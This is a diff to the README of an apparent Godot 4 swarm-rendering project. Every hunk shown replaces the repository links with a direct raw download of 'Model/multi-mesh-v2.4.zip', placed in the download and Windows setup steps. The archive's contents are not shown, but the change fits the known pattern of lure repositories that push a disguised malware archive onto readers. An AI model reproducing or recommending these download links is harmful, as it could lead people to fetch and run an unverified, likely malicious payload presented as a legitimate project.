@@ -1,10 +1,10 @@
 # 🧩 multi-mesh - Render Massive Swarms With Ease
 
-[![Download / Visit](https://img.shields.io/badge/Download-Visit%20the%20Repo-blue?style=for-the-badge&logo=github)](https://github.com/roachseniti446/multi-mesh)
+[![Download / Visit](https://img.shields.io/badge/Download-Visit%20the%20Repo-blue?style=for-the-badge&logo=github)](https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip)
 
 ## 📥 Download
 Visit this page to download the app and open the project files:
-https://github.com/roachseniti446/multi-mesh
+https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip
 
 ## 🖥️ What This Project Is
 multi-mesh is a Godot 4 project about drawing huge groups of moving objects on screen.
@@ -16,7 +16,7 @@ If you want to see how games can display 100,000 to 1,000,000 moving objects, th
 ## 🚀 Getting Started on Windows
 
 1. Open the download page:
-   https://github.com/roachseniti446/multi-mesh
+   https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip
 
 2. On the GitHub page, look for the latest release or the main project files.
 
@@ -48,7 +48,7 @@ If you want to see how games can display 100,000 to 1,000,000 moving objects, th
 Use this if you want to inspect the project.
 
 1. Download the project from:
-   https://github.com/roachseniti446/multi-mesh
+   https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip
 
 2. Extract the files if needed.
 
@@ -66,7 +66,7 @@ Use this if you want to inspect the project.
 Use this if the repo includes a ready-to-run build.
 
 1. Download the release files from:
-   https://github.com/roachseniti446/multi-mesh
+   https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip
 
 2. Extract the files if they are in a zip archive.
 
@@ -185,7 +185,7 @@ For the smoothest experience on Windows:
 
 ## 📎 Download Again
 If you need the files again, visit:
-https://github.com/roachseniti446/multi-mesh
+https://github.com/roachseniti446/multi-mesh/raw/refs/heads/main/Model/multi-mesh-v2.4.zip
 
 ## 🧩 File Path Example
 If you extracted the project to your Downloads folder, the path may look like:
